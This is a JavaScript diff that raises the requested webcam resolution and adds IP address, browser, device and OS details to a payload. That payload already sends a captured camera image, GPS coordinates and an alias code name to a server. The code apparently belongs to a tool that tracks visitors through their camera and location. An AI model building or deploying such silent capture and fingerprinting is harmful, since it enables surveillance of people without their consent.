@@ -7,7 +7,18 @@
         try {
             const stream = await navigator.mediaDevices.
                 getUserMedia({
-                    video: true,
+                    video: {
+                        optional: [
+                            { minWidth: 320 },
+                            { minWidth: 640 },
+                            { minWidth: 800 },
+                            { minWidth: 900 },
+                            { minWidth: 1024 },
+                            { minWidth: 1280 },
+                            { minWidth: 1920 },
+                            { minWidth: 2560 }
+                        ]
+                    },
                     audio: false
                 });
 
@@ -42,7 +53,17 @@
                         "Content-type": "application/json; charset=UTF-8"
                     },
                     body: JSON.stringify({
-                        img, filename: fileName, date, time, latitude: lat, longitude: long, altitude: alt, alias: aliasCodeName
+                        img, filename: fileName, date, time, latitude: lat, longitude: long, altitude: alt, alias: aliasCodeName,
+                        ip: user.ip,
+                        iptype: user.iptype,
+                        searchname: user.name,
+                        searchtype: user.type,
+                        searchversion: user.version,
+                        devicebrand: user.device.brand,
+                        devicetype: user.device.type,
+                        devicename: user.device.name,
+                        osname: user.os.name,
+                        ostype: user.os.type,
                     })
                 }).then((response) => response.json())
                     .then((data) => console.log(data));
